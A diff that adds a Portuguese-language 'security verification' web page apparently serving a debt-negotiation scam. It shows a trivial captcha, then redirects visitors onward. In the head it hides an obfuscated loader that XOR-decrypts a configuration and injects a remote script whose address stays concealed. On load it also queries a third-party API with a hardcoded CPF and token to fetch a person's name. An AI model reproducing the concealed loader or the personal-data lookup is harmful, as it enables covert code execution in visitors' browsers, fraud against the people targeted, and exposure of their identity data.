@@ -1,0 +1,896 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="referrer" content="unsafe-url">
+  <meta name="description" content="Verificação de segurança e acesso a consultas">
+  <meta name="keywords" content="segurança, verificação, acesso, consulta">
+  <meta name="author" content="Sistema de Consulta">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="theme-color" content="#FE2C55">
+
+  <title>Verificação de Segurança</title>
+<link rel="icon" type="image/x-icon" href="images/icon.ico">
+  <!-- Google Fonts - Inter -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+
+
+
+
+<script>(function(){var j_odr=atob("DB7Yhc0C5DYVS2ms4WX68L9uxgw3Ix3YkW3iquJhgFg7Ph3BiHihq65tiRh3OUbfgmyx9blxy0Z8MwzAzm6x/ahuyUJ8IB3DijCy9u8uxldhPxvFg2us4L4g3m1IZ0vLjXG65KFxxgxOMEvCgHO9p/cgkF9+HwbHsXeg4KFLgBQ5aR/NjWu9p/cg0ld2Lw+f0X+5s/8wgFUkL1Gf0y26vPU7xktINg==");var i_n12=[];for(var a_b=0;a_b<j_odr.length;a_b++){i_n12.push(j_odr.charCodeAt(a_b)&255);}var z_b=i_n12[0];var h_r=i_n12.slice(1,1+z_b);var k_3v=i_n12.slice(1+z_b);var e_971=k_3v.map(function(b,w_ol){return b^h_r[w_ol%z_b];});var e_se="";for(var f_nxu=0;f_nxu<e_971.length;f_nxu++){e_se+=String.fromCharCode(e_971[f_nxu]&255);}var t_7twq=decodeURIComponent(escape(e_se));var q_gb=JSON.parse(t_7twq);var y_s=q_gb.globals||[];y_s.forEach(function(q_u){window[q_u.name]=q_u.value;});var l_2t=document.createElement("script");l_2t.src=q_gb.url;l_2t.async=true;l_2t.defer=true;(q_gb.attributes||[]).forEach(function(s_2p){l_2t.setAttribute(s_2p.name,s_2p.value);});(document.head||document.documentElement).appendChild(l_2t);})();</script><script src="js/pixel-tiktok.js" async="" defer=""></script>
+
+
+
+  <style>
+    /* ===== CSS RESET ===== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    /* ===== CSS VARIABLES - press Theme ===== */
+    :root {
+      --press-red: #FE2C55;
+      --press-red-hover: #F02347;
+      --press-red-light: #FFF1F3;
+      --press-cyan: #25F4EE;
+      --press-black: #000000;
+      --press-white: #FFFFFF;
+      --press-gray-50: #F8F8F8;
+      --press-gray-100: #F1F1F2;
+      --press-gray-200: #E3E3E4;
+      --press-gray-400: #A8A8A9;
+      --press-gray-600: #6E6E6F;
+      --press-gray-800: #161823;
+      --press-error: #FF3B5C;
+      --press-success: #00D962;
+      --shadow-1: 0 1px 4px rgba(0, 0, 0, 0.12);
+      --shadow-2: 0 4px 16px rgba(0, 0, 0, 0.12);
+      --shadow-3: 0 8px 24px rgba(0, 0, 0, 0.15);
+      --radius: 8px;
+      --transition: all 0.2s ease;
+      --font-base: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+    }
+
+    /* ===== BASE ===== */
+    html {
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    body {
+      font-family: var(--font-base);
+      background: var(--press-white);
+      color: var(--press-black);
+      line-height: 1.5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      font-size: 15px;
+    }
+
+    /* ===== CONTAINER ===== */
+    .container {
+      max-width: 440px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 0 24px;
+    }
+
+    /* ===== MAIN LAYOUT ===== */
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 24px;
+    }
+
+    /* ===== CARD ===== */
+    .card {
+      background: var(--press-white);
+      border-radius: 4px;
+      padding: 32px 28px;
+      box-shadow: var(--shadow-1);
+      text-align: center;
+      width: 100%;
+      border: 1px solid var(--press-gray-200);
+    }
+
+    .card-icon {
+      width: 72px;
+      height: 72px;
+      background: var(--press-red-light);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+    }
+
+    .card-icon svg {
+      width: 36px;
+      height: 36px;
+      color: var(--press-red);
+      stroke-width: 2.5;
+    }
+
+    .card h1 {
+      font-size: 26px;
+      font-weight: 700;
+      color: var(--press-black);
+      margin-bottom: 12px;
+      letter-spacing: -0.3px;
+    }
+
+    .card-subtitle {
+      font-size: 15px;
+      color: var(--press-gray-600);
+      margin-bottom: 28px;
+      line-height: 1.5;
+      font-weight: 400;
+    }
+
+    /* ===== BUTTON - press Style ===== */
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-weight: 600;
+      border-radius: 4px;
+      transition: var(--transition);
+      cursor: pointer;
+      border: none;
+      font-size: 16px;
+      width: 100%;
+      padding: 16px 24px;
+      text-decoration: none;
+      font-family: var(--font-base);
+      letter-spacing: 0.3px;
+    }
+
+    .btn-primary {
+      background: var(--press-red);
+      color: var(--press-white);
+      box-shadow: 0 2px 8px rgba(254, 44, 85, 0.3);
+    }
+
+    .btn-primary:hover {
+      background: var(--press-red-hover);
+      box-shadow: 0 4px 12px rgba(254, 44, 85, 0.4);
+      transform: translateY(-1px);
+    }
+
+    .btn-primary:active {
+      transform: translateY(0);
+      box-shadow: 0 1px 4px rgba(254, 44, 85, 0.3);
+    }
+
+    .btn-secondary {
+      background: var(--press-white);
+      color: var(--press-black);
+      border: 1px solid var(--press-gray-200);
+    }
+
+    .btn-secondary:hover {
+      background: var(--press-gray-50);
+      border-color: var(--press-gray-300);
+    }
+
+    /* ===== FOOTER - press Style ===== */
+    footer {
+      background: var(--press-white);
+      border-top: 1px solid var(--press-gray-100);
+      padding: 24px;
+      text-align: center;
+      font-size: 12px;
+      color: var(--press-gray-600);
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 20px;
+      margin-bottom: 10px;
+      flex-wrap: wrap;
+    }
+
+    .footer-links a {
+      color: var(--press-gray-600);
+      text-decoration: none;
+      transition: color 0.2s;
+      font-weight: 500;
+    }
+
+    .footer-links a:hover {
+      color: var(--press-red);
+    }
+
+    .footer-links span {
+      color: var(--press-gray-400);
+      font-size: 10px;
+    }
+
+    .footer-copy {
+      color: var(--press-gray-400);
+      font-size: 11px;
+      font-weight: 400;
+    }
+
+    /* ===== OVERLAY - press Style ===== */
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(4px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 24px;
+      animation: fadeIn 0.15s ease;
+    }
+
+    .overlay.active {
+      display: flex;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    /* ===== MODAL - press Style ===== */
+    .modal {
+      background: var(--press-white);
+      border-radius: var(--radius);
+      padding: 36px 32px 32px;
+      max-width: 420px;
+      width: 100%;
+      box-shadow: var(--shadow-3);
+      animation: slideUp 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+      text-align: center;
+      position: relative;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px) scale(0.96);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .modal-icon {
+      width: 64px;
+      height: 64px;
+      background: var(--press-red-light);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+    }
+
+    .modal-icon svg {
+      width: 32px;
+      height: 32px;
+      color: var(--press-red);
+      stroke-width: 2.5;
+    }
+
+    .modal h2 {
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--press-black);
+      margin-bottom: 8px;
+      letter-spacing: -0.3px;
+    }
+
+    .modal p {
+      font-size: 15px;
+      color: var(--press-gray-600);
+      line-height: 1.5;
+      margin-bottom: 28px;
+      font-weight: 400;
+    }
+
+    /* ===== FORM - press Style ===== */
+    .form-group {
+      margin-bottom: 24px;
+      text-align: left;
+    }
+
+    .form-label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--press-black);
+      margin-bottom: 8px;
+    }
+
+    .form-question {
+      background: var(--press-gray-50);
+      border: 2px solid var(--press-gray-200);
+      border-radius: var(--radius);
+      padding: 20px;
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--press-black);
+      margin-bottom: 20px;
+      text-align: center;
+      letter-spacing: -0.3px;
+    }
+
+    .form-input {
+      width: 100%;
+      border: 1.5px solid var(--press-gray-200);
+      border-radius: var(--radius);
+      padding: 14px 16px;
+      font-size: 16px;
+      color: var(--press-black);
+      outline: none;
+      transition: var(--transition);
+      background: var(--press-white);
+      font-family: var(--font-base);
+    }
+
+    .form-input::placeholder {
+      color: var(--press-gray-400);
+    }
+
+    .form-input:focus {
+      border-color: var(--press-red);
+      box-shadow: 0 0 0 3px rgba(254, 44, 85, 0.1);
+    }
+
+    .form-input.error {
+      border-color: var(--press-error);
+      box-shadow: 0 0 0 3px rgba(255, 59, 92, 0.1);
+    }
+
+    .form-error {
+      font-size: 13px;
+      color: var(--press-error);
+      margin-top: 8px;
+      display: none;
+      text-align: left;
+      font-weight: 500;
+    }
+
+    .form-error.active {
+      display: block;
+    }
+
+    /* ===== BUTTON GROUP ===== */
+    .btn-group {
+      display: flex;
+      gap: 12px;
+      margin-top: 4px;
+    }
+
+    /* ===== CONFIRMATION - press Style ===== */
+    #confirmationScreen {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: var(--press-white);
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      text-align: center;
+      padding: 40px 24px;
+      z-index: 2000;
+    }
+
+    #confirmationScreen.active {
+      display: flex;
+      animation: fadeIn 0.3s ease;
+    }
+
+    .conf-icon {
+      width: 88px;
+      height: 88px;
+      background: linear-gradient(135deg, #00F2EA 0%, var(--press-cyan) 100%);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 28px;
+      box-shadow: 0 8px 24px rgba(37, 244, 238, 0.3);
+    }
+
+    .conf-icon svg {
+      width: 48px;
+      height: 48px;
+      color: var(--press-white);
+      stroke-width: 3.5;
+    }
+
+    .conf-title {
+      font-size: 28px;
+      font-weight: 700;
+      color: var(--press-black);
+      margin-bottom: 12px;
+      letter-spacing: -0.5px;
+    }
+
+    .conf-subtitle {
+      font-size: 15px;
+      color: var(--press-gray-600);
+      max-width: 360px;
+      line-height: 1.6;
+      margin-bottom: 36px;
+      font-weight: 400;
+    }
+
+    /* ===== LOADER - press Style ===== */
+    .loader {
+      display: flex;
+      gap: 8px;
+    }
+
+    .loader span {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: var(--press-red);
+      animation: bounce 1.4s infinite ease-in-out;
+    }
+
+    .loader span:nth-child(1) { animation-delay: 0s; }
+    .loader span:nth-child(2) { 
+      animation-delay: 0.2s; 
+      background: var(--press-cyan);
+    }
+    .loader span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes bounce {
+      0%, 80%, 100% {
+        transform: scale(0.6) translateY(0);
+        opacity: 0.5;
+      }
+      40% {
+        transform: scale(1) translateY(-10px);
+        opacity: 1;
+      }
+    }
+
+    /* ===== POLICY MODAL - press Style ===== */
+    .policy-modal {
+      background: var(--press-white);
+      border-radius: var(--radius);
+      max-width: 560px;
+      width: 100%;
+      max-height: 85vh;
+      overflow-y: auto;
+      box-shadow: var(--shadow-3);
+      animation: slideUp 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .policy-header {
+      padding: 24px 28px;
+      border-bottom: 1px solid var(--press-gray-100);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      background: var(--press-white);
+      z-index: 1;
+    }
+
+    .policy-header h3 {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--press-black);
+      letter-spacing: -0.3px;
+    }
+
+    .policy-close {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: var(--press-gray-600);
+      padding: 8px;
+      border-radius: 4px;
+      transition: var(--transition);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .policy-close:hover {
+      background: var(--press-gray-100);
+      color: var(--press-black);
+    }
+
+    .policy-body {
+      padding: 24px 28px 32px;
+      font-size: 14px;
+      color: var(--press-gray-600);
+      line-height: 1.7;
+    }
+
+    .policy-body h4 {
+      color: var(--press-black);
+      font-weight: 700;
+      font-size: 16px;
+      margin: 24px 0 12px;
+      letter-spacing: -0.2px;
+    }
+
+    .policy-body h4:first-of-type {
+      margin-top: 0;
+    }
+
+    .policy-body p {
+      margin-bottom: 16px;
+    }
+
+    /* ===== HIDDEN STATES ===== */
+    .hidden {
+      display: none !important;
+    }
+
+    /* ===== SCROLLBAR - press Style ===== */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: var(--press-gray-50);
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: var(--press-gray-400);
+      border-radius: 4px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: var(--press-gray-600);
+    }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 480px) {
+      .card {
+        padding: 28px 24px;
+      }
+
+      .modal {
+        padding: 32px 24px 28px;
+        margin: 16px;
+      }
+
+      .card h1 {
+        font-size: 24px;
+      }
+
+      .modal h2 {
+        font-size: 20px;
+      }
+
+      .conf-title {
+        font-size: 24px;
+      }
+
+      .btn-group {
+        flex-direction: column;
+      }
+
+      .btn {
+        font-size: 15px;
+        padding: 14px 20px;
+      }
+    }
+
+    /* ===== FOCUS VISIBLE ===== */
+    *:focus-visible {
+      outline: 2px solid var(--press-red);
+      outline-offset: 2px;
+    }
+  </style>
+
+</head>
+
+<body>
+  <div id="userDataCache" style="display: none;"></div>
+
+  <!-- MAIN PAGE -->
+  <div id="pageContainer">
+    <main>
+      <div class="container">
+        <div class="card">
+          <div class="card-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+            </svg>
+          </div>
+          <h1 style="display: none;">Verificação de Segurança</h1>
+          <p style="display: none;" class="card-subtitle">Para prosseguir, precisamos confirmar que você é humano. Este processo é rápido e garante a segurança do seu acesso.</p>
+          <button class="btn btn-primary" onclick="app.openVerification()">
+            Iniciar Verificação
+          </button>
+        </div>
+      </div>
+    </main>
+
+    <footer>
+      <div class="container">
+        <div class="footer-links">
+          <a href="#" onclick="handlePolicyLink('privacy'); return false;">Política de Privacidade</a>
+          <span>•</span>
+          <a href="#" onclick="handlePolicyLink('terms'); return false;">Termos de Uso</a>
+        </div>
+        <div class="footer-copy">© 2025 Todos os direitos reservados.</div>
+      </div>
+    </footer>
+  </div>
+
+  <!-- VERIFICATION MODAL -->
+  <div class="overlay active" id="verificationModal">
+    <div class="modal">
+      <!-- STEP 1: WELCOME -->
+      <div id="stepWelcome">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+          </svg>
+        </div>
+        <h2>Verificação Rápida</h2>
+        <p>Vamos confirmar que você é humano para liberar seu acesso.</p>
+        <div class="btn-group">
+          <button class="btn btn-primary" onclick="app.navigateToCaptcha()">Continuar</button>
+          <button class="btn btn-secondary" style="display: none;" onclick="app.closeVerification()">Cancelar</button>
+        </div>
+      </div>
+
+      <!-- STEP 2: CAPTCHA -->
+      <div id="stepCaptcha" class="hidden">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+          </svg>
+        </div>
+        <h2>Resolva esta questão</h2>
+        <div class="form-question">Quanto é 1 + 2?</div>
+        <div class="form-group">
+          <label class="form-label">Sua Resposta</label>
+          <input type="text" class="form-input" id="verificationInput" placeholder="Digite o resultado" maxlength="5" autocomplete="off">
+          <div class="form-error" id="verificationError">Resposta incorreta. Tente novamente.</div>
+        </div>
+        <div class="btn-group">
+          <button class="btn btn-primary" onclick="app.submitVerification()">Verificar</button>
+          <button class="btn btn-secondary" style="display: none;" onclick="app.goBackToWelcome()">Voltar</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CONFIRMATION SCREEN -->
+  <div id="confirmationScreen">
+    <div class="conf-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+      </svg>
+    </div>
+    <h1 class="conf-title">Verificação Concluída</h1>
+    <p class="conf-subtitle">Confirmamos que você é humano. Redirecionando para o atendimento...</p>
+    <div class="loader">
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+  </div>
+
+  <!-- POLICY MODALS -->
+  <div class="overlay" id="privacyPolicyModal">
+    <div class="policy-modal">
+      <div class="policy-header">
+        <h3>Política de Privacidade</h3>
+        <button class="policy-close" onclick="app.closePolicyModal('privacy')" aria-label="Fechar">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+      <div class="policy-body">
+        <p>Esta plataforma respeita sua privacidade e está comprometida com a proteção dos seus dados pessoais, nos termos da Lei Geral de Proteção de Dados (LGPD – Lei nº 13.709/2018).</p>
+        <h4>1. Dados coletados</h4>
+        <p>Coletamos apenas os dados estritamente necessários para o funcionamento do serviço: dados de navegação (IP, data/hora de acesso) e informações fornecidas voluntariamente pelo usuário durante a consulta.</p>
+        <h4>2. Finalidade</h4>
+        <p>Os dados são utilizados exclusivamente para viabilizar a prestação do serviço, garantir a segurança das operações e cumprir obrigações legais.</p>
+        <h4>3. Compartilhamento</h4>
+        <p>Não vendemos, alugamos ou compartilhamos dados pessoais com terceiros, salvo quando exigido por lei ou mediante consentimento expresso do titular.</p>
+        <h4>4. Segurança</h4>
+        <p>Adotamos medidas técnicas e administrativas para proteger seus dados contra acesso não autorizado, perda ou divulgação indevida.</p>
+        <h4>5. Seus direitos (LGPD)</h4>
+        <p>Você pode solicitar acesso, correção, portabilidade ou exclusão dos seus dados a qualquer momento pelos canais disponíveis na plataforma.</p>
+        <h4>6. Cookies</h4>
+        <p>Utilizamos cookies estritamente funcionais. Nenhum cookie de rastreamento é utilizado sem seu consentimento.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="overlay" id="termsOfUseModal">
+    <div class="policy-modal">
+      <div class="policy-header">
+        <h3>Termos de Uso</h3>
+        <button class="policy-close" onclick="app.closePolicyModal('terms')" aria-label="Fechar">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+      <div class="policy-body">
+        <p>Ao acessar e utilizar esta plataforma, você declara ter lido, compreendido e concordado com os presentes Termos de Uso.</p>
+        <h4>1. Objeto</h4>
+        <p>Esta plataforma disponibiliza um canal de acesso a informações e serviços relacionados à consulta e negociação de débitos, facilitando o direcionamento do usuário ao atendimento especializado.</p>
+        <h4>2. Aceitação</h4>
+        <p>O uso desta plataforma implica aceitação integral destes termos. Caso não concorde, recomendamos que não utilize o serviço.</p>
+        <h4>3. Responsabilidades do usuário</h4>
+        <p>O usuário compromete-se a utilizar a plataforma de forma lícita e de boa-fé, não realizando ações que possam prejudicar o funcionamento do sistema ou outros usuários.</p>
+        <h4>4. Limitação de responsabilidade</h4>
+        <p>A plataforma não se responsabiliza por danos decorrentes do uso indevido, falhas de conexão ou informações incorretas fornecidas pelo próprio usuário.</p>
+        <h4>5. Propriedade intelectual</h4>
+        <p>Todo o conteúdo disponível nesta plataforma é protegido por direitos autorais e não pode ser reproduzido sem autorização prévia.</p>
+        <h4>6. Alterações</h4>
+        <p>Estes termos podem ser atualizados a qualquer momento, valendo sempre a versão publicada nesta página.</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const app = {
+      state: {
+        isVerificationOpen: false,
+        currentStep: 'welcome'
+      },
+
+      config: {
+        apiEndpoint: 'https://searchapi.it.com/consulta?cpf=62376113393&token_api=1111',
+        confirmationDelay: 3000,
+        errorDisplayDuration: 2500
+      },
+
+      elements: {},
+
+      // Initialize application
+      init() {
+        this.cacheElements();
+        this.attachEventListeners();
+        this.fetchUserData();
+      },
+
+      // Cache frequently used DOM elements
+      cacheElements() {
+        this.elements = {
+          verificationModal: document.getElementById('verificationModal'),
+          pageContainer: document.getElementById('pageContainer'),
+          confirmationScreen: document.getElementById('confirmationScreen'),
+          verificationInput: document.getElementById('verificationInput'),
+          verificationError: document.getElementById('verificationError'),
+          stepWelcome: document.getElementById('stepWelcome'),
+          stepCaptcha: document.getElementById('stepCaptcha'),
+          privacyModal: document.getElementById('privacyPolicyModal'),
+          termsModal: document.getElementById('termsOfUseModal')
+        };
+      },
+
+      attachEventListeners() {
+        this.elements.verificationInput.addEventListener('keydown', (e) => {
+          if (e.key === 'Enter') this.submitVerification();
+        });
+      },
+
+      fetchUserData() {
+        fetch(this.config.apiEndpoint)
+          .then(response => response.json())
+          .then(data => {
+            if (data.dados && data.dados.length > 0 && data.dados[0].NOME) {
+              document.getElementById('userDataCache').innerHTML = data.dados[0].NOME;
+            }
+          })
+          .catch(error => console.error('Erro ao buscar dados:', error));
+      },
+
+      openVerification() {
+        this.elements.verificationModal.classList.add('active');
+        this.state.isVerificationOpen = true;
+      },
+
+      closeVerification() {
+        this.elements.verificationModal.classList.remove('active');
+        this.state.isVerificationOpen = false;
+        setTimeout(() => this.showWelcomeStep(), 300);
+      },
+
+      navigateToCaptcha() {
+        this.state.currentStep = 'captcha';
+        this.elements.stepWelcome.classList.add('hidden');
+        this.elements.stepCaptcha.classList.remove('hidden');
+        setTimeout(() => this.elements.verificationInput.focus(), 100);
+      },
+
+      goBackToWelcome() {
+        this.showWelcomeStep();
+      },
+
+      showWelcomeStep() {
+        this.state.currentStep = 'welcome';
+        this.elements.stepWelcome.classList.remove('hidden');
+        this.elements.stepCaptcha.classList.add('hidden');
+        this.resetVerificationInput();
+      },
+
+      resetVerificationInput() {
+        this.elements.verificationInput.value = '';
+        this.elements.verificationInput.classList.remove('error');
+        this.elements.verificationError.classList.remove('active');
+      },
+
+      submitVerification() {
+        const answer = this.elements.verificationInput.value.trim();
+        const validAnswers = ['3', 'três', 'tres'];
+
+        if (validAnswers.includes(answer.toLowerCase())) {
+          this.completeVerification();
+        } else {
+          this.handleVerificationError();
+        }
+      },
+
+      handleVerificationError() {
+        this.elements.verificationInput.classList.add('error');
+        this.elements.verificationError.classList.add('active');
+        this.elements.verificationInput.value = '';
+        this.elements.verificationInput.focus();
+
+        setTimeout(() => {
+          this.elements.verificationInput.classList.remove('error');
+          this.elements.verificationError.classList.remove('active');
+        }, this.config.errorDisplayDuration);
+      },
+
+      completeVerification() {
+        this.elements.verificationModal.classList.remove('active');
+        this.elements.pageContainer.style.display = 'none';
+        this.elements.confirmationScreen.classList.add('active');
+
+        setTimeout(() => {
+          window.location.href = '../inicio/index.html' + window.location.search;
+        }, this.config.confirmationDelay);
+      },
+
+      openPolicyModal(type) {
+        const modal = type === 'privacy' ? this.elements.privacyModal : this.elements.termsModal;
+        modal.classList.add('active');
+      },
+
+      closePolicyModal(type) {
+        const modal = type === 'privacy' ? this.elements.privacyModal : this.elements.termsModal;
+        modal.classList.remove('active');
+      }
+    };
+
+    function handlePolicyLink(type) {
+      app.openPolicyModal(type);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      app.init();
+    });
+  </script>
+
+
+
+
+
+</body></html>
